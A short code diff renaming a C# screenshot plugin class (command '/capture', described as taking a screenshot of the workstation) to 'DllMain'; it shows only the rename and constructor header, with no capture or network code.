@@ -6,10 +6,9 @@ using System.Drawing;
 
 namespace Plugins.CapScrn
 {
-
-    public class CapScrnPlugin : IModule
+    public class DllMain : IModule
     {
-        public CapScrnPlugin()
+        public DllMain()
         {
             Pattern = "/capture";
             Description = "Get a screenshot of the workstation.";
